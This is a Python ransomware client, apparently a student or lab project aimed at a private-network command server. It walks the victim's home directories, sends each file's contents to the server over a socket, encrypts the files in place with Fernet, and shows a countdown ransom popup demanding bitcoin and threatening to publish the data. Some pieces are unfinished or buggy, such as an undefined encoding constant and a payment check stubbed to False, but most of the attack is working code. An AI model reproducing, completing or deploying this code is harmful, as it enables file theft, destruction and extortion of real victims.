import os
from os.path import expanduser
from cryptography.fernet import Fernet
import subprocess
import time
import signal
from C2Server import list_safe_directories, get_files_in_dir
import base64
import logging
import socket
import math


class Ransomware: 
    SERVER_IP = "192.168.56.110"
    ENCODING = "utf-8"
    MAX_SIZE = 1024

    def __init__(self, host1, host2, number):
        # Construct hostname of the remote server from the first two
        # arguments.
        self._host = self.SERVER_IP
        # Calculate the port number from the last argument.
        self._port = self.decode_port(number)
        # Initialize socket for the connection.
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def host(self):
        """ Server that sends us the malicious code. """
        return self._host

    @host.setter
    def host(self, new_host):
        self._host = new_host

    def decode_hostname(self, str1, str2):
        """ Returns hostname of the remote server. """
        return str2[::-1] + str1[::-1]

    @property
    def port(self):
        """ Port, on which the server runs (`int`). """
        return self._port

    @port.setter
    def port(self, new_port):
        self._port = new_port

    def decode_port(self, port):
        """Returns target port of the remote server. """
        return int(math.sqrt(port))

    @property
    def socket(self):
        """ Client socket. """
        return self._socket

    #TODO Rafi/Yusef:
    def send_file_to_server(self, file_path, file):
            
        """ Opening and reading the file data. """
        file = open(file_path, "r")
        data = file.read()

        """ Sending the filename to the server. """
        self._socket.send(base64.b64encode(file.encode(Ransomware.FORMAT)))
        msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.FORMAT)
        print(f"[SERVER]: {msg}")

        """ Sending the file data to the server. """
        self._socket.send(base64.b64encode(data.encode(Ransomware.FORMAT)))
        msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.FORMAT)
        print(f"[SERVER]: {msg}")
        
        """ Closing the file. """
        file.close()

    #TODO Subin:
    def check_if_user_has_paid(self):
        return False

    # Method that lists all of the non-hidden, non-vital  directories bellow the inserted directory
    def list_safe_directories(self, directory):

        result = []
        excluded_dirs = set([".", "..", ".Trash-1000", ".config", ".local", ".cache"])

        # Go through all of the directories and exlcude the ones in the excluded_dirs set
        for root, dirs, _ in os.walk(directory):
            dirs[:] = [d for d in dirs if not d.startswith(".") and d not in excluded_dirs]

            result.append(root)
            for directory in dirs:
                result.append(os.path.join(root, directory))

        return result  # Return the list of directories

    # Method that retrieves all of the files in a directory and purposely does not include the ransomeware
    def get_files_in_dir(self, directory):
        # change to home directory so that the paths are correct relative paths.
        os.chdir(directory)

        files = []
        for file in os.listdir(directory):
            # We do not want to encrypt our own ransomware
            if file == "mal.py" or file == "key.key":
                continue
            if os.path.isfile(file):
                files.append(file)

        return files
    
    def establish_connection(self):
        """ Create a connection to the server. """
        try:
            print(self._host)
            self.socket.connect((self._host, self._port))
        except socket.error:
            logging.debug('Dropper could not connect to the server.')
            return

    # Method for encrypting a single file
    def encrypt_file(self, file, key):
        print("started")
        with open(file, "rb") as the_file:
            contents = the_file.read()

        encrypted_contents = Fernet(key).encrypt(contents)
        with open(file, "wb") as the_file:
            the_file.write(encrypted_contents)
        print("terminated")


    # Encrypt all the safe to encrypt files on a victims pc
    def encrypt_and_send_all_files(self, directory, key):

        number_of_files = 0
        size_of_files = 0

        dir_list = self.list_safe_directories(directory)
        for dir in dir_list:
            for file in self.get_files_in_dir(dir):
                file_path = os.path.join(dir, file)
                file_size = os.path.getsize(file_path)
                size_of_files += file_size
                number_of_files += 1

                # Send file to server
                self.send_file_to_server(file_path, file)

                # Encrypt file
                self.encrypt_file(file_path, key)

        print("Number of files encrypted: " + str(number_of_files))
        print("Total size of files: " + str(size_of_files))


    def decrypt_file(self, file_path, key):
        with open(file_path, "rb") as file:
            encrypted_contents = file.read()

        decrypted_contents = Fernet(key).decrypt(encrypted_contents)
        with open(file_path, "wb") as the_file:
            the_file.write(decrypted_contents)


    def decrypt_all_files(self, directory, key):
        dir_list = self.list_safe_directories(directory)
        for dir in dir_list:
            for file in self.get_files_in_dir(dir):
                file_path = os.path.join(dir, file)
                self.decrypt_file(file_path, key)

    def execute_attack(self):
        self.establish_connection()
        
        """ Receiving the public key. """
        filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
        print(f"[RECV] Receiving the public key.")
        file = open(filename, "w")
        self._socket.send("Public key filename received.".encode("utf-8"))
 
        """ Receiving the public key from the server. """
        data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
        file.write(data)
          
        print(f"[RECV] Receiving the public key data.")
        #file.write(data)
        self._socket.send("File data received".encode("utf-8"))
 
        """ Closing the file. """
        file.close()
        
        # Decode the command and dump it into a file.
        # decode_payload = base64.b64decode(command)
        # self.dump_data(decode_payload)

        self.send_file_to_server()
        
        # exec(open("mal.py").read())



#Main function/ control flow
if __name__ == '__main__':

    # Home directory
    HOME = expanduser("~")

    logging.basicConfig(level=logging.DEBUG)

    # Initialize dropper application.
    ransomware = Ransomware('tsoh', 'lacol', 729000000)
    # Collect the malicious code and dump it into the file.
    ransomware.execute_attack()

    #TODO: Replace this with Asymetric crypto
    #Generate key and make a key file
    #generate_key()
    # VICTIM DOESN'T GENERATE THE KEY PAIR! This key file should be sent to them from the server when Implant.py is run
    with open("key.key", "rb") as key:
        key = key.read()


    #Encrypt all files
    # encrypt_and_send_all_files(home, key)


    #NOTE: Ideally this time would be stored on the server so that if they close their computer and open it 
    # again its still the same. Alternatively mayb we tell them not to close their computer?

    start_time = time.time()
    remaining_time = 86400

    while remaining_time > 0:
            # Format the remaining time as hours, minutes and seconds
            hours = int(remaining_time // 3600)
            minutes = int((remaining_time%3600) // 60)
            seconds = int(remaining_time % 60)

            # Text to be displayed on the pop up
            text = f"HAHAHAHA, all your files are encrypted and stored on our server!\n If you pay us in the next <b>{hours:02d}:{minutes:02d}:{seconds:02d}</b> we will decrypt your files and delete our copy.\n If you do not pay us, the files will be published to the internet for all to see. \nTransfer: xxx btc to wallet_id"

            # Show the dialog with the remaining time, keep refreshing the window.
            popup = subprocess.Popen(["zenity", "--warning", "--text", text,"--width", "400", "--height", "200" ])

            # Update the remaining time
            elapsed_time = time.time() - start_time
            remaining_time = remaining_time - elapsed_time
            time.sleep(1)
            popup.send_signal(signal.SIGTERM)

            if (ransomware.check_if_user_has_paid()):
                break


    #User has paid before the time ran out
    if (ransomware.check_if_user_has_paid()):
        popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
        # decrypt_all_files(home, key)
        #TODO: Implement code to delete all the files that are stored on the server

    else: # Timer has run out
        #TODO: Implement file deletion and internet publication code.
        print('huh')
